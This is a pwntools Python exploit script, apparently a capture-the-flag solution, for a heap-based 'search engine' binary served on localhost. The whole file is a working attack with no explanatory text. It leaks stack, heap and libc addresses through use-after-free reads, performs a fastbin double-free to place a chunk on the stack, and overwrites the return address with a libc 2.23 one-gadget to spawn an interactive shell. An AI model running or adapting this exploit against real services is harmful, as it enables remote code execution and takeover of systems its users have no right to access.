from pwn import *
elf = ELF('search-bf61fbb8fa7212c814b2607a81a84adf')

conn = remote('127.0.0.1', 12122)

def searchWithWord(size, word, isDel):
    conn.sendline('1')
    conn.recvuntil('size:')
    conn.sendline(str(size))
    conn.recvuntil('word:')
    conn.sendline(word)
    conn.recvuntil('(y/n)?')
    conn.sendline(isDel)

def indexSentence(size, sentence):
    conn.sendline('2')
    conn.recvuntil('size:')
    conn.sendline(str(size))
    conn.recvuntil('sentence:')
    conn.sendline(sentence)

def quit():
    conn.sendline('3')


#from IPython import embed; embed()
conn.sendline('K'*48)
conn.recvuntil('K'*48)
conn.sendline('K'*48)
conn.recvuntil('K'*48)
stackAddr = u64(conn.recv(6)+'\x00\x00')
log.info('stackAddr = %x' % stackAddr)

indexSentence(0x60, 'a'*(0x60-6) + ' hello')
indexSentence(0x60, 'a'*(0x60-7) + ' hello2')
searchWithWord(0x5, 'hello', 'y')
searchWithWord(0x6, 'hello2', 'y')

conn.sendline('1')
conn.recvuntil('size:')
conn.sendline('6')
conn.recvuntil('word:')
conn.sendline('\x00'*6)
conn.recvuntil('Found 96: ')
heapAddr = u64(conn.recv(6)+'\x00\x00')
log.info('heapAddr = %x' % heapAddr)
conn.recvuntil('(y/n)?')
conn.sendline('n')

smallbinSize = 1000 # should be <= 1000
indexSentence(smallbinSize, 'b'*(smallbinSize-5) + ' libc')
searchWithWord(4, 'libc', 'y')
conn.sendline('1')
conn.recvuntil('size:')
conn.sendline('4')
conn.recvuntil('word:')
conn.sendline('\x00'*4)
#from IPython import embed; embed()
conn.recvuntil('Found '+str(smallbinSize)+': ')
libcAddr = u64(conn.recv(6)+'\x00\x00') - 0x3c3b78
log.info('libcAddr = %x' % libcAddr)
conn.recvuntil('(y/n)?')
conn.sendline('n')

indexSentence(0x30, 'a'*(0x30-8) + ' '+'1'*7)
indexSentence(0x30, 'a'*(0x30-9) + ' '+'2'*8)
indexSentence(0x30, 'a'*(0x30-10) + ' '+'3'*9)
searchWithWord(0x7, '1'*7, 'y')
searchWithWord(0x8, '2'*8, 'y')
searchWithWord(0x9, '3'*9, 'y')
"""
(0x50)     fastbin[3]: c -> b -> a-> 0
"""
searchWithWord(0x8, '\x00'*8, 'y')
"""
(0x50)     fastbin[3]: b -> c -> b
"""
stack = p64(stackAddr+0x58-0x6) # misaligned => size : 0x40
indexSentence(0x30, stack.ljust(0x30, '\x00'))
indexSentence(0x30, 'B'*0x30)
indexSentence(0x30, 'C'*0x30)

ret = p64(0x400896) # ret
payload = '\x00'*6 + ret*3 + p64(libcAddr+0xEF6C4) #libc 2.23 offset
indexSentence(0x30, payload.ljust(0x30, '\x00'))
conn.sendline('3')
conn.recv()
conn.interactive()

